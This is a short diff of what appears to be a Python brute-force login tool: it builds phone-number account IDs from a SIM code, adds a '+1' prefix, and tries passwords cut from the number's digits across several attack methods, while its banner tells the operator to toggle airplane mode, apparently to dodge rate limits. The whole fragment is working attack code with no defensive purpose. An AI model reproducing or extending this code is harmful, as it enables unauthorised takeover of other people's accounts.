@@ -849,8 +849,9 @@ def NUM():
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
-      idf = kode+guru
-      pwv = [idf[:6],idf[:8],idf,]
+      ids = kode+guru
+      idf = '+1'+ids
+      pwv = [ids[:6],ids[:8],ids,]
       if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
